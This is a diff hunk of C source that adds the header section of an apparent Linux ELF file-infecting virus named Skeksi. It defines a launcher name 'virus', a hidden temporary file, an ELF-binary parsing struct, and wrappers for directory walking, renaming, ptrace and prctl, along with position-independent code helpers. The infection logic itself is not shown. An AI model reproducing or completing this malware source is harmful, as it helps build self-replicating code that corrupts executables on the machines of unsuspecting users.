@@ -16,13 +16,116 @@
 #include <sys/user.h>
 #include <sys/prctl.h>
 #include <sys/time.h>
-void Exit(long);
 
-#define __ASM__ asm __volatile__
+#define VIRUS_LAUNCHER_NAME "virus"
+
+struct linux_dirent64 {
+        uint64_t             d_ino;
+        int64_t             d_off;
+        unsigned short  d_reclen;
+        unsigned char   d_type;
+        char            d_name[0];
+} __attribute__((packed));
+
+	
+
+/* libc */ 
+
+void Memset(void *mem, unsigned char byte, unsigned int len);
+void _memcpy(void *, void *, unsigned int);
+int _printf(char *, ...);
+char * itoa(long, char *);
+char * itox(long, char *);
+int _puts(char *);
+int _puts_nl(char *);
+size_t _strlen(char *);
+char *_strchr(const char *, int);
+char * _strrchr(const char *, int);
+int _strncmp(const char *, const char *, size_t);
+int _strcmp(const char *, const char *);
+int _memcmp(const void *, const void *, unsigned int);
+char _toupper(char c);
+
+
+/* syscalls */
+long _ptrace(long request, long pid, void *addr, void *data);
+int _prctl(long option, unsigned long arg2, unsigned long arg3, unsigned long arg4, unsigned long arg5);
+int _fstat(long, void *);
+int _mprotect(void * addr, unsigned long len, int prot);
+long _lseek(long, long, unsigned int);
+void Exit(long);
+void *_mmap(void *, unsigned long, unsigned long, unsigned long,  long, unsigned long);
+int _munmap(void *, size_t);
+long _open(const char *, unsigned long, long);
+long _write(long, char *, unsigned long);
+int _read(long, char *, unsigned long);
+int _getdents64(unsigned int fd, struct linux_dirent64 *dirp,
+                    unsigned int count);
+int _rename(const char *, const char *);
+int _close(unsigned int);
+int _gettimeofday(struct timeval *, struct timezone *);
+
+/* Customs */
+unsigned long get_rip(void);
+void end_code(void);
+void dummy_marker(void);
+static inline uint32_t get_random_number(int) __attribute__((__always_inline__));
+void display_skeksi(void);
 
 #define PIC_RESOLVE_ADDR(target) (get_rip() - ((char *)&get_rip_label - (char *)target))
 
+#if defined(DEBUG) && DEBUG > 0
+ #define DEBUG_PRINT(fmt, args...) _printf("DEBUG: %s:%d:%s(): " fmt, \
+    __FILE__, __LINE__, __func__, ##args)
+#else
+ #define DEBUG_PRINT(fmt, args...) /* Don't do anything in release builds */
+#endif
+
+#define PAGE_ALIGN(x) (x & ~(PAGE_SIZE - 1))
+#define PAGE_ALIGN_UP(x) (PAGE_ALIGN(x) + PAGE_SIZE) 
+#define PAGE_ROUND(x) (PAGE_ALIGN_UP(x))
+#define STACK_SIZE 0x4000000
+
+#define TMP ".xyz.skeksi.elf64"
+#define RODATA_PADDING 17000 // enough bytes to also copy .rodata and skeksi_banner
+
+#define LUCKY_NUMBER 7
+#define MAGIC_NUMBER 0x15D25 //thankz Mr. h0ffman
+
+#define __ASM__ asm __volatile__
+
+extern long real_start;
 extern long get_rip_label;
+
+struct bootstrap_data {
+	int argc;
+	char **argv;
+};
+
+// PER: Structure of the ELF executable
+typedef struct elfbin {
+	Elf64_Ehdr *ehdr;
+	Elf64_Phdr *phdr;
+	Elf64_Shdr *shdr;
+	Elf64_Dyn *dyn;
+	Elf64_Addr textVaddr;
+	Elf64_Addr dataVaddr;
+	size_t textSize;
+	size_t dataSize;
+	Elf64_Off dataOff;
+	Elf64_Off textOff;
+	uint8_t *mem;
+	size_t size;
+	char *path;
+	struct stat st;
+	int fd;
+	int original_virus_exe;
+} elfbin_t;
+
+#define DIR_COUNT 4 //PER: Number of directories
+
+
+
 
 int _getuid(void)
 {
